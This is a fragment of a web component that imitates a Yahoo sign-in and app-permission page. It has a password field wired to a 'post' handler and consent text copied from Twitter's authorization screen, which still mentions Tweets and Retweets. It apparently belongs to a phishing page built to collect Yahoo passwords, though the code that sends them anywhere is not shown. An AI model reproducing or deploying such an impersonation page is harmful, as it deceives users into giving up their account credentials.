        ...
        <div class="box">
            <div class="mini-box">
                    ...
                    <div class="submit-opstion">
                        ...
                        <input bind:value={password} placeholder="password"required> <br>
                        <button type="button" on:click={post} style="background-color:#06abf1"><b>Log In</b></button>
                    ...
                    <div class="unorder-list">
                        <ul>
                            <li>See Yahoo from your timeline (including  protected mail) as well as your Lists and collections.</li>
                            <li>See your Yahoo profile information and account settings.
                            ...
                            <li>Post and delete mail for you, and engage with Tweets   posted by others (Like, un-Like, or reply to a mail,
                                Retweet, etc.) for you.</li> 
                        ...
                        <p class="simple-text">Learn more about third-party app permissions in the <a href="#">Help Center</a></p>
                    </div>
    ...
    <footer>
        <div class="custom-containerr">
            <div class="footer-text">
                <p class="big-text">We recommend reviewing the app’s terms and privacy policy to understand how it will use data from your yahoo account.
                 You can revoke access to any app at any time from the <span>Apps and sessions</span>  section of your yahoo account settings.</p>
